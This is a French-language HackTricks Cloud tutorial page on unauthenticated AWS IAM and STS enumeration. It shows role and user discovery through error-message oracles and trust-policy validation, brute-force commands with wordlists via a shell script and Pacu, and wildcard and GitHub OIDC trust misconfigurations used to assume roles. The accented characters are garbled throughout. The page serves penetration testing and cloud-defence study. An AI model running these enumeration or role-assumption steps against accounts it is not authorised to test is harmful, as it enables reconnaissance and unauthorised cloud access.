# AWS - IAM & STS Enum non authentifi√©

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

## √ânum√©rer les r√¥les et les noms d'utilisateur dans un compte

### ~~For√ßage brut de l'assumption de r√¥le~~

{% hint style="danger" %}
**Cette technique ne fonctionne plus** car que le r√¥le existe ou non, vous obtenez toujours cette erreur :

`An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:iam::947247140022:user/testenv is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::429217632764:role/account-balanceasdas`

Vous pouvez **tester cela en ex√©cutant** :

`aws sts assume-role --role-arn arn:aws:iam::412345678909:role/superadmin --role-session-name s3-access-example`
{% endhint %}

Tenter de **prendre un r√¥le sans les autorisations n√©cessaires** d√©clenche un message d'erreur AWS. Par exemple, si non autoris√©, AWS pourrait renvoyer :
```ruby
An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:iam::012345678901:user/MyUser is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::111111111111:role/aws-service-role/rds.amazonaws.com/AWSServiceRoleForRDS
```
Ce message confirme l'existence du r√¥le mais indique que sa politique d'assumption ne permet pas votre assumption. En revanche, essayer de **prendre un r√¥le inexistant entra√Æne une erreur diff√©rente** :
```less
An error occurred (AccessDenied) when calling the AssumeRole operation: Not authorized to perform sts:AssumeRole
```
Int√©ressant, cette m√©thode de **distinction entre les r√¥les existants et non existants** est applicable m√™me √† travers diff√©rents comptes AWS. Avec un ID de compte AWS valide et une liste de mots cibl√©e, on peut √©num√©rer les r√¥les pr√©sents dans le compte sans faire face √† des limitations inh√©rentes.

Vous pouvez utiliser ce [script pour √©num√©rer les principaux potentiels](https://github.com/RhinoSecurityLabs/Security-Research/tree/master/tools/aws-pentest-tools/assume_role_enum) en abusant de ce probl√®me.

### Politiques de confiance : Brute-Force des r√¥les et utilisateurs inter-comptes

Configurer ou mettre √† jour la **politique de confiance d'un r√¥le IAM implique de d√©finir quels ressources ou services AWS sont autoris√©s √† assumer ce r√¥le** et √† obtenir des identifiants temporaires. Si la ressource sp√©cifi√©e dans la politique **existe**, la politique de confiance est enregistr√©e **avec succ√®s**. Cependant, si la ressource **n'existe pas**, une **erreur est g√©n√©r√©e**, indiquant qu'un principal invalide a √©t√© fourni.

{% hint style="warning" %}
Notez que dans cette ressource, vous pourriez sp√©cifier un r√¥le ou un utilisateur inter-compte :

* `arn:aws:iam::acc_id:role/role_name`
* `arn:aws:iam::acc_id:user/user_name`
{% endhint %}

Voici un exemple de politique :
```json
{
"Version":"2012-10-17",
"Statement":[
{
"Effect":"Allow",
"Principal":
{
"AWS":"arn:aws:iam::216825089941:role\/Test"
},
"Action":"sts:AssumeRole"
}
]
}
```
#### GUI

C'est l'**erreur** que vous trouverez si vous utilisez un **r√¥le qui n'existe pas**. Si le r√¥le **existe**, la politique sera **enregistr√©e** sans aucune erreur. (L'erreur concerne la mise √† jour, mais cela fonctionne √©galement lors de la cr√©ation)

![](<../../../.gitbook/assets/image (153).png>)

#### CLI
```bash
### You could also use: aws iam update-assume-role-policy
# When it works
aws iam create-role --role-name Test-Role --assume-role-policy-document file://a.json
{
"Role": {
"Path": "/",
"RoleName": "Test-Role",
"RoleId": "AROA5ZDCUJS3DVEIYOB73",
"Arn": "arn:aws:iam::947247140022:role/Test-Role",
"CreateDate": "2022-05-03T20:50:04Z",
"AssumeRolePolicyDocument": {
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::316584767888:role/account-balance"
},
"Action": [
"sts:AssumeRole"
]
}
]
}
}
}

# When it doesn't work
aws iam create-role --role-name Test-Role2 --assume-role-policy-document file://a.json
An error occurred (MalformedPolicyDocument) when calling the CreateRole operation: Invalid principal in policy: "AWS":"arn:aws:iam::316584767888:role/account-balanceefd23f2"
```
Vous pouvez automatiser ce processus avec [https://github.com/carlospolop/aws\_tools](https://github.com/carlospolop/aws_tools)

* `bash unauth_iam.sh -t user -i 316584767888 -r TestRole -w ./unauth_wordlist.txt`

Notre utilisation de [Pacu](https://github.com/RhinoSecurityLabs/pacu) :

* `run iam__enum_users --role-name admin --account-id 229736458923 --word-list /tmp/names.txt`
* `run iam__enum_roles --role-name admin --account-id 229736458923 --word-list /tmp/names.txt`
* Le r√¥le `admin` utilis√© dans l'exemple est un **r√¥le dans votre compte √† √™tre usurp√©** par pacu pour cr√©er les politiques dont il a besoin pour l'√©num√©ration

### Privesc

Dans le cas o√π le r√¥le √©tait mal configur√© et permet √† quiconque de l'assumer :
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": "sts:AssumeRole"
}
]
}
```
L'attaquant pourrait simplement le supposer.

## F√©d√©ration OIDC de tiers

Imaginez que vous parvenez √† lire un **workflow Github Actions** qui acc√®de √† un **r√¥le** √† l'int√©rieur d'**AWS**.\
Cette confiance pourrait donner acc√®s √† un r√¥le avec la **politique de confiance** suivante :
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Principal": {
"Federated": "arn:aws:iam::<acc_id>:oidc-provider/token.actions.githubusercontent.com"
},
"Action": "sts:AssumeRoleWithWebIdentity",
"Condition": {
"StringEquals": {
"token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
}
}
}
]
}
```
Cette politique de confiance peut √™tre correcte, mais le **manque de plus de conditions** devrait vous inciter √† vous m√©fier.\
Ceci est d√ª au fait que le r√¥le pr√©c√©dent peut √™tre assum√© par **QUICONQUE de Github Actions** ! Vous devriez sp√©cifier dans les conditions d'autres √©l√©ments tels que le nom de l'organisation, le nom du d√©p√¥t, l'environnement, la branche...

Une autre mauvaise configuration potentielle est d'**ajouter une condition** comme suit :
```json
"StringLike": {
"token.actions.githubusercontent.com:sub": "repo:org_name*:*"
}
```
Notez que **l'ast√©risque** (*) avant le **deux-points** (:). Vous pouvez cr√©er une org telle que **org\_name1** et **assumer le r√¥le** depuis une action Github.

## R√©f√©rences

* [https://www.youtube.com/watch?v=8ZXRw4Ry3mQ](https://www.youtube.com/watch?v=8ZXRw4Ry3mQ)
* [https://rhinosecuritylabs.com/aws/assume-worst-aws-assume-role-enumeration/](https://rhinosecuritylabs.com/aws/assume-worst-aws-assume-role-enumeration/)

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PR au** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
